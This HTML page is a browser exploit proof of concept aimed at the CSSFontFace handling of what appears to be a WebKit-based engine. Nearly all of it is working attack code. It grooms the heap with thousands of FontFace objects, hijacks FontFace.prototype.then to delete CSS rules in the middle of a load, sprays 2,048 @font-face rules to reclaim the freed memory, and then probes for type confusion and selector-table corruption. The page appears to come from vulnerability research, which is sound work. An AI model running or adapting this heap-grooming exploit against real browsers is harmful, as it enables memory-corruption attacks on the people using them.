<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CSSFontFace Verification PoC</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<div id="out" style="white-space:pre-wrap;font-family:monospace;"></div>
<script>
"use strict";

var O = document.getElementById("out");
function log(m) { O.textContent += m + "\n"; }
function ok(m)   { log("  ✅ " + m); }
function fail(m) { log("  ❌ " + m); }
function sep(m)  { log("── " + m + " ──"); }

// FontFace base64 minimal font (WOFF)
var FB = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb = (function(){ var s = atob(FB), b = new Uint8Array(s.length); for(var i=0;i<s.length;i++) b[i]=s.charCodeAt(i); return b; })();

function mkBuf() { var c = new Uint8Array(FBb.length); c.set(FBb); return c.buffer; }
function fs() { try { void document.body.offsetTop; } catch(e) {} }

var sh = document.getElementById("s").sheet;
var trigger, uafFired = false;

// Phase 1: Create holes in CSSFontFace IsoHeap
log("=== Phase 1: Creating holes in CSSFontFace IsoHeap ===");
var holes = [];
for(var i = 0; i < 4096; i++) {
    try {
        var f = new FontFace("h_" + i, mkBuf(), {
            unicodeRange: "U+E1" + (i % 16).toString(16),
            style: i % 2 === 0 ? "normal" : "italic",
            weight: String(100 + (i % 9) * 100)
        });
        document.fonts.add(f);
        holes.push(f);
    } catch(e) {}
}
fs();
log("  Created " + holes.length + " FontFace objects");

// Delete every other one to create holes
var deleted = 0;
for(var i = 1; i < holes.length; i += 2) {
    try { document.fonts.delete(holes[i]); deleted++; } catch(e) {}
}
fs();
log("  Deleted " + deleted + " (every other) to create holes");

// Phase 2: Create trigger face
sep("Phase 2: Create trigger FontFace + CSS rules");
trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
document.fonts.add(trigger);
void trigger.loaded;
log("  trigger FontFace added");

// Flush rules for heap churn
var fst = document.createElement("style");
document.head.appendChild(fst);
var fsh = fst.sheet;
for(var i = 0; i < 768; i++) {
    try {
        fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}", fsh.cssRules.length);
    } catch(e) {}
}
log("  768 flush rules added");

// Phase 3: Install then-getter to trigger deleteRule during load()
sep("Phase 3: Installing FontFace.prototype.then getter");
Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get: function() {
        if(this === trigger && !uafFired) {
            uafFired = true;
            log("  >>> then() getter TRIGGERED ===");
            
            // 3a: Delete flush rules + CSS rule for "x"
            try {
                sh.deleteRule(1); // Delete rule for family "x"
                log("  deleteRule(1) executed");
            } catch(e) { log("  deleteRule(1) error: " + e); }
            
            fs();
            
            // 3b: Delete flush rules
            try {
                while(fsh.cssRules.length) fsh.deleteRule(0);
                log("  All flush rules deleted");
            } catch(e) {}
            
            fs();
            
            // 3c: Delete more holes for GC pressure
            var deletedHoles = 0;
            for(var i = 0; i < holes.length; i += 4) {
                try { document.fonts.delete(holes[i]); deletedHoles++; } catch(e) {}
            }
            log("  Deleted " + deletedHoles + " more holes");
            
            fs();
            
            // 3d: Force GC (allocate 16MB)
            var gcPressure = [];
            for(var i = 0; i < 4; i++) {
                var t = [];
                for(var j = 0; j < 128; j++) t.push(new ArrayBuffer(8192));
                gcPressure.push(t);
            }
            log("  16MB GC pressure allocated");
            
            fs();
            
            // 3e: Spray CSS rules to reclaim freed slot
            for(var i = 0; i < 2048; i++) {
                try {
                    sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+
                        (100 + (i % 9) * 100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",
                        sh.cssRules.length);
                } catch(e) {}
            }
            log("  2048 CSS rules sprayed (A_0 to A_2047)");
            
            fs();
            
            // 3f: Force layout to trigger font loading
            try {
                var d = document.createElement("div");
                d.textContent = "AB";
                d.style.cssText = "position:absolute;left:-9999px;font:64px trigger;";
                document.body.appendChild(d);
                void d.offsetWidth;
                log("  Forced layout for font loading");
            } catch(e) {}
            
            fs();
        }
        return undefined;
    }
});

// Phase 4: Trigger the confusion
sep("Phase 4: Triggering document.fonts.load()");
document.fonts.load("1em trigger, x", "AB").then(function(faces) {
    sep("Phase 5: Analysis of results");
    
    log("  load() returned " + faces.length + " faces:");
    for(var i = 0; i < faces.length; i++) {
        var f = faces[i];
        log("    Face " + i + ": family='" + f.family + "' weight=" + f.weight + " style=" + f.style + " stretch=" + f.stretch);
    }
    
    // Find the confused object
    var aFamily = null, aFace = null;
    for(var i = 0; i < faces.length; i++) {
        if(faces[i].family && faces[i].family.indexOf("A_") === 0) {
            aFamily = faces[i].family;
            aFace = faces[i];
            break;
        }
    }
    
    if(aFamily) {
        ok("RECLAIMED OBJECT FOUND: family='" + aFamily + "'");
        
        // Find the CSS rule for this family
        var aIndex = -1;
        for(var i = 0; i < sh.cssRules.length; i++) {
            try {
                var r = sh.cssRules[i];
                if(r.type === 5 && r.style.getPropertyValue("font-family").indexOf(aFamily) !== -1) {
                    aIndex = i;
                    break;
                }
            } catch(e) {}
        }
        
        if(aIndex !== -1) {
            ok("Found CSSRule at index " + aIndex);
            var aRule = sh.cssRules[aIndex];
            var aStyle = aRule.style;
            
            // Test: Write via CSSRule, read via FontFace
            sep("Phase 6: Selector table corruption test");
            
            // Test 1: Write font-weight = 700
            aStyle.setProperty("font-weight", "700");
            fs();
            var readWeight = aFace.weight;
            if(String(readWeight) === "700") {
                ok("font-weight write/read WORKS: weight=" + readWeight);
                log("  → CSSRule writes to A_NN's CSSFontFace struct");
                log("  → FontFace reads from same struct");
                log("  → Selector entry for 'x' points to A_NN's CSSFontFace");
                
                // Test 2: Write font-family to a unique value
                aStyle.setProperty("font-family", "VERIFICATION_PROBE");
                fs();
                var readFamily = aFace.family;
                if(readFamily.indexOf("VERIFICATION_PROBE") !== -1) {
                    ok("font-family write/read WORKS: family=" + readFamily);
                    
                    // Test 3: Try to find original "x" object
                    sep("Phase 7: Checking if original 'x' object is alive");
                    
                    // Try to access the original FontFace for "x" 
                    // The FontFace was created by document.fonts.add() → we never had a JS reference to it
                    // But let's check if the C++ object behind the selector is alive
                    
                    var origFace = null;
                    try {
                        // If the original "x" CSSFontFace was freed:
                        // - selector entry now points to A_NN
                        // - original C++ object is gone
                        // - FontFace wrapper for "x" is gone too
                        
                        // If the original "x" CSSFontFace is still alive:
                        // - It's just been removed from the selector table
                        // - But we can't access it because we never had a JS reference
                        
                        log("  Cannot directly check if original 'x' object is alive");
                        log("  (we never had a FontFace JS reference to it)");
                        
                        // Indirect test: does deleting the A_NN CSSRule break the FontFace?
                        sep("Phase 8: Deletion test");
                        aStyle.setProperty("font-weight", "300");
                        fs();
                        
                        // Delete the A_NN CSSRule
                        try {
                            sh.deleteRule(aIndex);
                            log("  Deleted CSSRule for " + aFamily);
                            fs();
                        } catch(e) {}
                        
                        // Read from the FontFace again
                        var afterDelete = String(aFace.weight);
                        log("  FontFace.weight after CSSRule deletion: " + afterDelete);
                        
                        if(afterDelete === "300") {
                            ok("  FontFace STILL WORKS after CSSRule deletion!");
                            log("  → This means the CSSFontFace C++ object is STILL ALIVE");
                            log("  → It's NOT a UAF — it's selector table corruption");
                            log("  → The object persists because the FontFace JS wrapper keeps Ref<> alive");
                        } else {
                            log("  FontFace.weight changed to: " + afterDelete);
                            log("  → The CSSFontFace might have been freed and reallocated");
                            log("  → Or another spray reclaimed the slot");
                        }
                    } catch(e) {
                        log("  Error in deletion test: " + e);
                    }
                    
                } else {
                    fail("font-family write did not propagate (read=" + readFamily + ")");
                }
            } else {
                fail("font-weight write did not propagate (read=" + readWeight + ")");
            }
        } else {
            fail("Could not find CSSRule for " + aFamily);
        }
    } else {
        fail("No reclaimed object found — confusion did NOT occur");
        log("  load() may have returned the original 'x' FontFace");
        log("  or the trigger failed to fire");
    }
    
    sep("PoC Complete");
}).catch(function(err) {
    fail("Error during load(): " + err);
});
</script>
</body>
</html>
